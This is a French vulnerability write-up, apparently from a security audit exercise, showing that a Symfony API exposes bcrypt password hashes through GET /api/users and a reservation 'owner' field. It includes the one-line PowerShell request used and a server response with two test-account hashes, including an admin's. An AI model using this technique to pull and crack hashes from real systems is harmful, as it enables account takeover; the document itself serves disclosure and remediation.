# Preuve bonus — Information Disclosure (fuite de données sensibles)

## Endpoints concernés
- `GET /api/users`
- Champ `owner` retourné dans les réponses de `/api/reservations/{id}`

## Description
Deux points distincts font fuiter des données sensibles :

1. **`GET /api/users`** liste tous les comptes utilisateurs du système,
   accessible à n'importe quel utilisateur authentifié (`ROLE_USER` inclus),
   avec le **hash bcrypt du mot de passe en clair** dans la réponse JSON.

2. Les réponses de l'API sur `Reservation` sérialisent l'objet `User`
   complet dans le champ `owner`, exposant également le hash du mot de passe
   à chaque consultation d'une réservation.

## Cause technique
- `User` a été exposé en `#[ApiResource]` sans configuration de groupes de
  sérialisation (`normalizationContext`) pour exclure le champ `password`.
- Le `Serializer` de Symfony sérialise donc toutes les propriétés publiques
  accessibles via getter, y compris `getPassword()`.

## Exploitation

```powershell
Invoke-RestMethod -Uri "http://localhost:8086/api/users" -Method Get -Headers @{ Authorization = "Bearer $token" }
```

## Réponse serveur obtenue (200 OK)
```json
{
  "@context": "/api/contexts/User",
  "@id": "/api/users",
  "@type": "Collection",
  "totalItems": 2,
  "member": [
    {
      "@id": "/api/users/3",
      "id": 3,
      "email": "user@test.com",
      "password": "$2y$13$SOx1Q0NSzPkw5XoFsLK2M.u93aZnIIH2.UXmEuRnT23o0CurRWHZu"
    },
    {
      "@id": "/api/users/4",
      "id": 4,
      "email": "admin@test.com",
      "password": "$2y$13$aLhPX73Sg5nI8su4zz6QIetJ3bf02smz3Ke5Nx8fRyiZkN.3tpzz6"
    }
  ]
}
```

## Impact
- Technique : exposition des hash bcrypt de tous les comptes, y compris les
  comptes admin.
- Métier : un attaquant pourrait tenter de casser ces hash hors-ligne
  (attaque par dictionnaire/brute force) pour obtenir les mots de passe en
  clair, et potentiellement compromettre le compte administrateur.

## Criticité
**Élevée** — bien que bcrypt résiste raisonnablement au brute force, exposer
des hash de mots de passe reste une fuite de données sensibles critique,
d'autant plus combinée à un accès non restreint (n'importe quel `ROLE_USER`
peut lister tous les comptes).

## Captures d'écran

